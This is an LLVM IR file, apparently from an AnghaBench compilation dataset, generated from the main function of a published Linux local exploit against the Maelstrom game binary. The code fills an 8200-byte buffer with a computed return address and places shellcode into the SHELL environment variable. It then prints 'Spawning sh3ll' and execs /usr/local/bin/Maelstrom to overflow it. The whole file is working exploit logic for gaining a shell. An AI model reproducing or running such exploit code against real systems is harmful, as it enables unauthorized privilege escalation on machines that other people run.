; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22617.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22617.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"Maelstrom\00", align 1
@SWITCH = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [39 x i8] c"Maelstrom Local Exploit by: Knight420\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"Usage: %s <ret> <align>\0A\00", align 1
@STACK_START = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"1@\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"SHELL=%s\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [17 x i8] c"Return Addr: %p\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"Spawning sh3ll\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"/usr/local/bin/Maelstrom\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8200 x i8], align 16
  %7 = alloca [8200 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4 x i8*], align 16
  %11 = alloca [2 x i8*], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** @SWITCH, align 8
  store i8* %14, i8** %13, align 8
  %15 = getelementptr inbounds i8*, i8** %13, i64 1
  %16 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 0
  store i8* %16, i8** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %15, i64 1
  store i8* null, i8** %17, align 8
  %18 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %19 = getelementptr inbounds [8200 x i8], [8200 x i8]* %7, i64 0, i64 0
  store i8* %19, i8** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %18, i64 1
  store i8* null, i8** %20, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 2
  br i1 %22, label %23, label %30

23:                                               ; preds = %2
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 0) #3
  unreachable

30:                                               ; preds = %2
  %31 = load i32, i32* @STACK_START, align 4
  %32 = sext i32 %31 to i64
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i64 @atoi(i8* %35)
  %37 = sub i64 %32, %36
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %9, align 4
  %39 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 0
  %40 = call i32 @memset(i8* %39, i8 signext 65, i32 100)
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 2
  %43 = load i8*, i8** %42, align 8
  %44 = call i64 @atoi(i8* %43)
  %45 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 %44
  %46 = bitcast i8* %45 to i32*
  store i32* %46, i32** %8, align 8
  br label %47

47:                                               ; preds = %55, %30
  %48 = load i32*, i32** %8, align 8
  %49 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 8200
  %50 = bitcast i8* %49 to i32*
  %51 = icmp ult i32* %48, %50
  br i1 %51, label %52, label %58

52:                                               ; preds = %47
  %53 = load i32, i32* %9, align 4
  %54 = load i32*, i32** %8, align 8
  store i32 %53, i32* %54, align 4
  br label %55

55:                                               ; preds = %52
  %56 = load i32*, i32** %8, align 8
  %57 = getelementptr inbounds i32, i32* %56, i32 1
  store i32* %57, i32** %8, align 8
  br label %47

58:                                               ; preds = %47
  %59 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 8199
  store i8 0, i8* %59, align 1
  %60 = getelementptr inbounds [8200 x i8], [8200 x i8]* %6, i64 0, i64 0
  %61 = call i32 @memcpy(i8* %60, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  %62 = getelementptr inbounds [8200 x i8], [8200 x i8]* %7, i64 0, i64 0
  %63 = load i8*, i8** @shellcode, align 8
  %64 = call i32 @snprintf(i8* %62, i32 8200, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %63)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %66 = load i32, i32* %9, align 4
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i32 %66)
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %69 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  %70 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %71 = call i32 @execve(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i8** %69, i8** %70)
  %72 = load i32, i32* %3, align 4
  ret i32 %72
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
